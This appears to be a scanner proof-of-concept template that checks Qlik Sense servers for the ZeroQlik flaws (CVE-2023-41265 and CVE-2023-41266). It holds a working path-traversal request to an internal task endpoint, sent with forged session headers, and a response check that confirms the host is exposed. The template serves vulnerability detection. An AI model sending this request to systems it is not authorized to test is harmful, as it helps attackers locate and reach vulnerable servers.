name: poc-yaml-zeroqlik-rce
rules:
- method: GET
  path: /resources/qmc/fonts/../../../qrs/ReloadTask?xrfkey=1333333333333337&filter=.ttf
  headers:
    Host: localhost
    Cookie: X-Qlik-Session=13333333-3333-3333-3333-333333333337
    X-Qlik-Xrfkey: '1333333333333337'
    User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/115.0.5790.110 Safari/537.36
  body: ''
  expression: '(response.status == 400) && (response.body.bcontains(bytes("The comparison expression does not consist of three
    elements: .ttf")))'
detail:
  author: Adam Crosser
  description: ZeroQlik Vulnerability (CVE-2023-41265 and CVE-2023-41266)
  links:
  - https://github.com/adysec/nuclei_poc
  - https://community.qlik.com/t5/Official-Support-Articles/Critical-Security-fixes-for-Qlik-Sense-Enterprise-for-Windows/ta-p/2110801
  - https://www.praetorian.com/blog/advisory-qlik-sense/
  - https://www.praetorian.com/blog/qlik-sense-technical-exploit
